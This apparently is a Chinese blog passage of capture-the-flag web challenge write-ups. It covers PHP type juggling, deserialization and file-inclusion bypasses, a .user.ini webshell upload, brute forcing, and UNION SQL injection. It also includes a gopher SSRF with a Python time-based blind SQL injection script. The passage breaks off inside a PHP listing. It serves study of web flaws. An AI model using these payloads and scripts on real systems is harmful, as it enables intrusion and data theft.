<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>两次比较，第一次是<code>===</code><br>全等于操作过程如下：<br>1.判断全等于操作符2边的数据类型是否相同 如果不相同，则返回false<br>2.判断全等于操作符2边的值是否相等，如果 不相等，则返回false<br>3.最后将上面2步的操作进行与操作。返回与操作的结果。<br>第二次是<code>==</code>，只比较值（强制进行数据类型转换）</p>
<p>所以我们传入的必须是经过两次url编码（get也会解码）后的<code>admin</code>（任意数量字符），比如传入<code>admin</code>-&gt;<code>%61dmin</code>-&gt;<code>%2561dmin</code>（这里需要传入的地址可以是根目录或者&#x2F;index.php，但是不能是&#x2F;index.phps，因为它只是源码）</p>
<p>urlencode将需要转码的字符转为16进制，然后从右到左，取4位(不足4位直接处理)，每2位做一位，前面加上%，编码成%XY格式。<br>但是这里直接使用在线工具对admin编码是不可以的，因为它不会对字符和数字进行编码，我们需要直接转成16进制，然后加上%<br><a target="_blank" rel="noopener" href="http://www.ku51.net/ox2str/">字符转16进制</a></p>
<p>然后就能看到flag<code>cyberpeace&#123;2babf104e185faee3b5700e452be462d&#125;</code></p>
<h2 id="unserialize3-1"><a href="#unserialize3-1" class="headerlink" title="unserialize3(1)"></a>unserialize3(1)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//这里本来题目没有大括号</span></span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>看到<code>?code=</code>我猜到应该是用get传参，其它就不会了<br>看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45552960/article/details/102664372">大佬的writeup</a>大概的思路是把xctf这个类序列化后的结果用get传过去，同时还要跳过__wakeup()函数</p>
<p>__wakeup()，执行unserialize()时，先会调用这个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$peak</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();<span class="comment">//使用new运算符来实例化该类（xctf）的对象为peak</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$peak</span>));<span class="comment">//输出被序列化的对象（peak）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>序列化的结果是<br><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>大概的意思是长度4的object xctf包含一个只有1个参数的数组<br>里面有一个长度4的string flag的值为长度3的string 111</p>
<p>那要怎样才能跳过__wakeup()函数呢？</p>
<p>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
<p>将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即<br><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>然后用上面说的get方式访问，就能看到flag<br><code>cyberpeace&#123;dc66a5c3f1fa0cb3bd5517df3fa8dc8c&#125;</code></p>
<h2 id="ics-06-x2F-XCTF-4th-CyberEarth-1"><a href="#ics-06-x2F-XCTF-4th-CyberEarth-1" class="headerlink" title="ics-06&#x2F;XCTF 4th-CyberEarth(1)"></a>ics-06&#x2F;XCTF 4th-CyberEarth(1)</h2><p>点开是一个恢弘的界面（贴图）<br><img data-src="https://img-blog.csdnimg.cn/b658f9640764436888232d139902424a.png" alt="在这里插入图片描述"><br>看到这么多选项，我是没想着一个个试着点的，但是论快捷还是一个个点。<br>也可以查看元素搜href，不过还是点方便。<br>点击报表中心会转到另一个界面，让你选日期玩，不过怎么选都没用<br>不过可以注意到url有一个get传参。<br>尝试使用sql注入好像不太行，看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107946683">别人的writeup</a>才知道要爆破。。（这是我没想到的)<br>这里burpsuite中payload type要选择Numbers，设置从1到5000，step为1<br>当id为2333时长度不一样<br>在response可以看到flag</p>
<p><code>cyberpeace&#123;53736b5e0bffa8fa26d2b5987f74fa52&#125;</code></p>
<h2 id="view-source-x2F-Cyberpeace-n3k0-1"><a href="#view-source-x2F-Cyberpeace-n3k0-1" class="headerlink" title="view_source&#x2F;Cyberpeace-n3k0(1)"></a>view_source&#x2F;Cyberpeace-n3k0(1)</h2><p>这里好像鼠标右键被禁用了，但是很少用右键打开检查。。<br>ctrl+u查看源码或者F12查看元素，得到<br>flag</p>
<p><code>cyberpeace&#123;41e995b7ee379f3bd0eedc31a829dee9&#125;</code></p>
<h2 id="get-post-x2F-Cyberpeace-n3k0-1"><a href="#get-post-x2F-Cyberpeace-n3k0-1" class="headerlink" title="get_post&#x2F;Cyberpeace-n3k0(1)"></a>get_post&#x2F;Cyberpeace-n3k0(1)</h2><p>这里跟着它的要求先get提交a&#x3D;1，然后post提交b&#x3D;2就能获得flag<br>这里post可以用HackBar插件，当然抓包在下面添加post也行<br><code>cyberpeace&#123;8e329e962b4c0ce9dd4149dca6a6e733&#125;</code></p>
<h2 id="robots-x2F-Cyberpeace-n3k0-1"><a href="#robots-x2F-Cyberpeace-n3k0-1" class="headerlink" title="robots&#x2F;Cyberpeace-n3k0(1)"></a>robots&#x2F;Cyberpeace-n3k0(1)</h2><p>访问<code>/robots.txt</code>可以看到<br><img data-src="https://img-blog.csdnimg.cn/b0028b67a9864f8399566c57fb7118bf.png" alt="在这里插入图片描述"><br>这里的Disallow参数代表禁止遵守robots规则的搜索引擎爬取<br>直接访问，可以获得flag<br><code>cyberpeace&#123;49643cd3a8ce8917ff5c2f0a022f198a&#125;</code></p>
<h2 id="backup-x2F-Cyberpeace-n3k0-1"><a href="#backup-x2F-Cyberpeace-n3k0-1" class="headerlink" title="backup&#x2F;Cyberpeace-n3k0(1)"></a>backup&#x2F;Cyberpeace-n3k0(1)</h2><p>访问<code>/index.php</code>没反应<br>常见的备份文件后缀名：</p>
<pre><code>.bak
.git
.svn
.swp
.~
.bash_history
.bkf
</code></pre>
<p>因为题目名是backup，所以后缀名有可能是bak<br>使用dirsearch试一下<br><img data-src="https://img-blog.csdnimg.cn/a49504cfeb64446b8b745e3d36a16904.png" alt="在这里插入图片描述"><br>访问<code>/index.php.bak</code>，会下载一个<code>index.php.bak</code>文件，记事本打开得到flag<br><code>Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</code></p>
<h2 id="cookie-x2F-Cyberpeace-n3k0-1"><a href="#cookie-x2F-Cyberpeace-n3k0-1" class="headerlink" title="cookie&#x2F;Cyberpeace-n3k0(1)"></a>cookie&#x2F;Cyberpeace-n3k0(1)</h2><p><img data-src="https://img-blog.csdnimg.cn/9cdf3d06a28f4523b413b02591a83b24.png" alt="在这里插入图片描述"><br>访问<code>/cookie.php</code>，提示<code>See the http response</code><br>在响应标头里可以看到flag<br><img data-src="https://img-blog.csdnimg.cn/d1f631048fce4688a5c3ae62844a825c.png" alt="在这里插入图片描述"><br><code>cyberpeace&#123;8d6cfbe3f601cd12e4e2c6f1b0807c11&#125;</code></p>
<h2 id="disabled-button-x2F-Cyberpeace-n3k0-1"><a href="#disabled-button-x2F-Cyberpeace-n3k0-1" class="headerlink" title="disabled_button&#x2F;Cyberpeace-n3k0(1)"></a>disabled_button&#x2F;Cyberpeace-n3k0(1)</h2><p><img data-src="https://img-blog.csdnimg.cn/15a204b429e141ae90e92c9b0d241f36.png" alt="在这里插入图片描述"><br>去掉disable，点击获得flag<br>或者可以post传<code>auth=flag</code><br><code>cyberpeace&#123;ce6972b365ff4502f2c0928f9d833569&#125;</code></p>
<h2 id="weak-auth-x2F-Cyberpeace-n3k0-1"><a href="#weak-auth-x2F-Cyberpeace-n3k0-1" class="headerlink" title="weak_auth&#x2F;Cyberpeace-n3k0(1)"></a>weak_auth&#x2F;Cyberpeace-n3k0(1)</h2><p>随便输了个<code>admin</code>，<code>password</code>试了一下，提示<br><img data-src="https://img-blog.csdnimg.cn/308edda2d480475e9326799a4a93287b.png" alt="在这里插入图片描述"><br>又随便输了个<code>1</code>，<code>1</code>试了下，提示<code>please login as admin</code><br>那就只用爆破密码就行<br>把top1w导入，本来以为很久，结果第一个就出了<br><img data-src="https://img-blog.csdnimg.cn/e029a1a201014975b0a3477ee2cc5983.png" alt="在这里插入图片描述"></p>
<p><img data-src="https://img-blog.csdnimg.cn/efd1e0f22b964a19b02242164c558e1f.png" alt="在这里插入图片描述"><br>获得flag<code>cyberpeace&#123;80b17eb4a68b7fcff023f3f9b8e7c371&#125;</code></p>
<h2 id="simple-php-x2F-Cyberpeace-n3k0-1"><a href="#simple-php-x2F-Cyberpeace-n3k0-1" class="headerlink" title="simple_php&#x2F;Cyberpeace-n3k0(1)"></a>simple_php&#x2F;Cyberpeace-n3k0(1)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">﻿<span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php中有两种比较符号</p>
<blockquote>
<p>&#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型<br>&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较</p>
</blockquote>
<p>get传入a和b<br>is_numeric() 函数用于检测变量是否为数字或数字字符串<br>要求a&#x3D;&#x3D;0且a不为空，a&#x3D;”0”或者a&#x3D;0a或者a&#x3D;任意字符串<br>要求b不为数字或数字字符串且大于1234，传入b&#x3D;1235a<br>所以传入<code>?a=0a&amp;b=1235a</code>就能获得完整flag<br><code>Cyberpeace&#123;647E37C7627CC3E4019EC69324F66C7C&#125;</code></p>
<h2 id="baby-web-1"><a href="#baby-web-1" class="headerlink" title="baby_web(1)"></a>baby_web(1)</h2><p>dirsearch发现如下<br><img data-src="https://img-blog.csdnimg.cn/06d915f2ec264647a03b7b702ea168d1.png" alt="在这里插入图片描述"><br>访问<code>index.php</code>会重定向到1.php，这里没有思路了。<br>看writeup发现需要使用burpsuite抓包<br>当它重定向时，send to repeater，修改GET &#x2F;index.php，send<br>提示Flag is hidden!</p>
<p>在响应头可以看到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221018145224981.png" alt="image-20221018145224981"><br><code>flag&#123;very_baby_web&#125;</code></p>
<h2 id="inget-x2F-宜兴网信办-1"><a href="#inget-x2F-宜兴网信办-1" class="headerlink" title="inget&#x2F;宜兴网信办(1)"></a>inget&#x2F;宜兴网信办(1)</h2><p>看题目抓不着头脑，结果看writeup说这是一个SQL注入的题<br>查了下inget，<code>投入；输入；输入过程</code>，okok（我看提示bypass想歪了）<br>bypass<code>绕过; 避开</code><br>使用sqlmap得到flag<br><code>cyberpeace&#123;d59b2f9aadab6159052039f0edeefe3a&#125;</code></p>
<h2 id="easyupload-x2F-CTF-1"><a href="#easyupload-x2F-CTF-1" class="headerlink" title="easyupload&#x2F;CTF(1)"></a>easyupload&#x2F;CTF(1)</h2><p>看名字就知道，上传一句话木马，但是提示<code>Your file looks wicked</code><br>上传正常图片可以，那就上传图片马<br>但是上传图片马也失败了<br>看了一下writeup，发现内容不能包含php，所以需要用短标签<br>可以使用图片马或者php前加<code>GIF89a</code><br><img data-src="https://img-blog.csdnimg.cn/70400023b924450d9646f23c31af199e.png" alt="在这里插入图片描述"><br>还需要上传<code>.user.ini</code>文件，上传时抓包修改<code>Content-Type: image/gif</code><br><img data-src="https://img-blog.csdnimg.cn/6451989056424d63bbffa2d9341321d3.png" alt="在这里插入图片描述"><br>通过.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br>提交后会显示路径，访问<code>/uploads/index.php</code><br><strong>但是它怎么知道这个目录下有php文件呢？</strong><br>这里需要访问的是index.php，通过<code>.user.ini</code>配置让它包含1.png<br>在蚁剑中可以看到flag在根目录<br><code>cyberpeace&#123;9aac6bc58d51e4ee318aee88578bd973&#125;</code></p>
<h2 id="fileinclude-x2F-宜兴网信办-1"><a href="#fileinclude-x2F-宜兴网信办-1" class="headerlink" title="fileinclude&#x2F;宜兴网信办(1)"></a>fileinclude&#x2F;宜兴网信办(1)</h2><p>提示<br><img data-src="https://img-blog.csdnimg.cn/52b5cb00ae2347b1bafd9abbcc760dbb.png" alt="在这里插入图片描述"><br>@include表示包含并运行指定文件的内容<br>file_get_contents() 把整个文件读入一个字符串中。</p>
<p>用hackbar传一个cookie：language&#x3D;chinese，提示变化<br>传flag的话，界面变为空白<br>看了下writeup，需要传入的cookie为：<br><code>Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p>
<blockquote>
<p>php:&#x2F;&#x2F;filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p>
</blockquote>
<p>然后能看到经base64加密后的字符串<br><code>PD9waHANCiRmbGFnPSJjeWJlcnBlYWNlezhhMzllNTc1N2U4ZDAzNTQyZjVlMzRlZjY1YzE1Nzk3fSI7DQo/Pg==</code><br>解密后获得flag<br><code>cyberpeace&#123;8a39e5757e8d03542f5e34ef65c15797&#125;</code></p>
<h2 id="very-easy-sql-x2F-CTF-1"><a href="#very-easy-sql-x2F-CTF-1" class="headerlink" title="*very_easy_sql&#x2F;CTF(1)"></a>*very_easy_sql&#x2F;CTF(1)</h2><p>点一下submit，发现它根本没有跳转，查看元素，发现果然是假表单<br><img data-src="https://img-blog.csdnimg.cn/ce4b966849e540499a4a972b1c2ed1a4.png" alt="在这里插入图片描述"><br>提示use.php，那就让访问<code>use.php</code></p>
<p>提示<code>url you want to curl</code></p>
<blockquote>
<p>cURL是一个利用URL语法在命令行下工作的文件传输工具</p>
</blockquote>
<p>输入flag好像没反应，看了一眼url，这不会也是sql注入吧</p>
<p>sqlmap level1好像不行</p>
<p>看了眼writeup，这是一个ssrf题，知识盲区。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60115503/article/details/124407499">gopher协议</a></p>
<p>URL编码：替换回车换行为*%0d%0a*</p>
<p>在kali的终端执行</p>
<p><code>curl http://61.147.171.105:57675/use.php?url=gopher://127.0.0.1:80/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aCookie%3A%20PHPSESSID%3D1f546328759632456215236845122365%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2024%250d%250a%250d%250auname%3Dadmin%2526passwd%3Dadmin</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:57675/use.php?url=gopher://127.0.0.1:80/_POST /index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: localhost:80</span><br><span class="line">Cookie: PHPSESSID=1f546328759632456215236845122365;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 24</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin</span><br></pre></td></tr></table></figure>

<p>响应包</p>
<p><img data-src="/../images/WRITEUP/image-20220919101805654.png" alt="image-20220919101805654"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this_is_your_cookie=YWRtaW4%3D</span><br></pre></td></tr></table></figure>

<p>所以这是一个Cookie注入</p>
<p><code>gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;+bs+&quot;%3B%250d%250a</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_GET /index.php HTTP/1.1</span><br><span class="line">Host: localhost:80</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: this_is_your_cookie=&quot; bs &quot;;</span><br><span class="line"></span><br><span class="line">bs为注入的字段</span><br><span class="line">bs = str(base64.b64encode(poc.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)</span><br></pre></td></tr></table></figure>

<p>构建下列POC，实现cookie延时注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://61.147.171.105:57675/use.php?url=&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		poc=<span class="string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span>+<span class="built_in">str</span>(pos)+<span class="string">&quot;,1) )=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,sleep(2),1) # &quot;</span></span><br><span class="line">		bs = <span class="built_in">str</span>(base64.b64encode(poc.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">		final_poc=<span class="string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span>+bs+<span class="string">&quot;%3B%250d%250a&quot;</span></span><br><span class="line">		t1=time.time()</span><br><span class="line">		res=requests.get(url+final_poc)</span><br><span class="line">		t2=time.time()</span><br><span class="line">		<span class="keyword">if</span>(t2-t1&gt;<span class="number">2</span>):</span><br><span class="line">			<span class="built_in">print</span>(t2-t1)</span><br><span class="line">			flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;c2329560bc8e2346a72681101d023249&#125;</code></p>
<h2 id="fileclude-x2F-CTF-1"><a href="#fileclude-x2F-CTF-1" class="headerlink" title="fileclude&#x2F;CTF(1)"></a>fileclude&#x2F;CTF(1)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致意思是get传file1和file2，file2的内容是<code>hello ctf</code><br>file1使用php:&#x2F;&#x2F;filter伪协议来读取源代码<br>file2可以用php:&#x2F;&#x2F;input来绕过<br><code>/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code><br>这里需要使用burpsite抓包修改get为POST，并且POST传”hello ctf”<br>得到base64加密后的<br><code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtmMTRiMDE4MzJlZDliMThiMzM4MGRiYzE3NzE1NjgyOX0=</code><br>解密，获得flag<br><code>cyberpeace&#123;f14b01832ed9b18b3380dbc177156829&#125;</code></p>
<h2 id="NewsCenter-x2F-XCTF-4th-QCTF-2018-2"><a href="#NewsCenter-x2F-XCTF-4th-QCTF-2018-2" class="headerlink" title="NewsCenter&#x2F;XCTF 4th-QCTF-2018(2)"></a>NewsCenter&#x2F;XCTF 4th-QCTF-2018(2)</h2><p>输入<code>1&#39; or 1=1#</code>发现有sql注入漏洞<br>sqlmap对抓包结果进行注入，得到flag<br><code>cyberpeace&#123;d59b2f9aadab6159052039f0edeefe3a&#125;</code><br>但是这个flag不是这一题的<br><strong>为什么sqlmap不行呢？</strong><br><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/1O5ENAr4d7/">sqlmap手册</a><br>因为之前用sqlmap刷了其它题，有缓存<br><strong>使用–purge清除缓存注入</strong></p>
<p>直接手工注入<br><code>1&#39; order by 4#</code>错误，说明3个注入点<br><code>1&#39; union select 1,2,3#</code>，发现2，3有输出<br><code>1&#39; union select 1,database(),3#</code>，dbs&#x3D;&#x3D;<code>news</code><br><code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;#</code>，tbn&#x3D;<code>news,secret_table</code><br><code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;#</code>，<code>id,fl4g</code><br><code>1&#39; union select 1,group_concat(id),group_concat(fl4g) from secret_table#</code><br>得到flag<br><code>QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
<h2 id="warmup-x2F-HCTF（2）"><a href="#warmup-x2F-HCTF（2）" class="headerlink" title="warmup&#x2F;HCTF（2）"></a>warmup&#x2F;HCTF（2）</h2><p>访问看到一个<img data-src="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" alt="img"></p>
<p>查看源代码发现提示<code>source.php</code>，访问看到php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span 